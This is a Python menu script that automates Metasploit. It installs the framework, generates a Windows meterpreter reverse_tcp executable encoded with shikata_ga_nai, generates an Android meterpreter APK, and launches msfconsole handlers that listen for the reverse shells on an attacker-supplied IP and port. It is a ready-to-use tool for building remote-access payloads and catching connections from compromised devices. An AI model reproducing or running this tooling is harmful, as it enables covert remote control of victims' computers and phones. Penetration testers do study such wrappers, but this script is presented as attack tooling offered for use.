import platform
import Installer
import time
import os
import subprocess
import sys
from xml.dom import NotFoundErr
try:
    import colorama
except ImportError:
    print('colorama is not installed, installing it with other neccessary modules')
    Installer.install()
from colorama import Fore, Style

def CLC():
    command = 'clear'
    if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
        command = 'cls'
    os.system(command)

def uno():
    CLC()
    print(Fore.LIGHTCYAN_EX + 'Installer executing in 3 secs' + Style.RESET_ALL)
    time.sleep(3)
    sistema=platform.system()
    if sistema=='Linux':
            if os.geteuid() != 0:
                print(Fore.RED +'re-run with sudo'+ Style.RESET_ALL)
                quit()
            else:
                posible=["1","2"]
                print(f"if {Fore.GREEN}arch{Fore.RESET}=1\nif {Fore.GREEN}debian-based{Fore.RESET}=2\n")
                distro=input('answer: ')
                opa=distro in posible
                if opa=="False":
                    exit()
                if distro=="1":
                    os.system('pacman -Syu')
                    os.system('pacman install curl wget gnupg2 metasploit')
                if distro=="2":
                    os.system('apt-get update')
                    os.system('apt-get install curl wget gnupg2')
                    os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall')            
                    os.system('chmod +x msfinstall')
                    os.system('./msfinstall')
    else:
       print(Fore.RED + 'You are on windows, pls, switch to Linux' + Style.RESET_ALL)
       quit()

def dos():
    lhost=input('Ip: ')
    lport=input('Port: ')
    frmt=input('Format: ')
    os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f '+frmt+ ' -e x86/shikata_ga_nai -o payload.exe')
    with open('initmsfc', 'w') as f:
        f.write('use exploit/multi/handler\n')
        f.write('set payload windows/meterpreter/reverse_tcp\n')
        f.write('set LHOST ' + lhost + '\n') 
        f.write('set LPORT ' + lport + '\n')
        f.write('exploit')
    os.system('msfconsole -r initmsfc')

def tres():
    lhost=input('Ip: ')
    lport=input('Port: ')
    os.system('msfvenom -p android/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -o payload.apk')
    with open('initmsfc', 'w') as f:
        f.write('use exploit/multi/handler\n')
        f.write('set payload android/meterpreter/reverse_tcp\n')
        f.write('set LHOST ' + lhost + '\n') 
        f.write('set LPORT ' + lport + '\n')
        f.write('exploit')
    print('Puting metasploit listening')
    os.system('msfconsole -r initmsfc')

def cuatro():
    lhost=input('Ip: ')
    lport=input('Port: ')
    payload=input('Payload (per exemple: android/meterpreter/reverse_tcp): ')
    with open('initmsfc', 'w') as f:
        f.write('use exploit/multi/handler\n')
        f.write('set payload ' + payload +'\n')
        f.write('set LHOST ' + lhost + '\n') 
        f.write('set LPORT ' + lport + '\n')
        f.write('exploit')
    print('Puting metasploit listening')
    os.system('msfconsole -r initmsfc')

def cinco():
    os.system('rm -r payload.exe')
    os.system('rm -r payload.apk')
    print(Fore.GREEN + 'All cleaned :)' + Style.RESET_ALL)
    time.sleep(2)
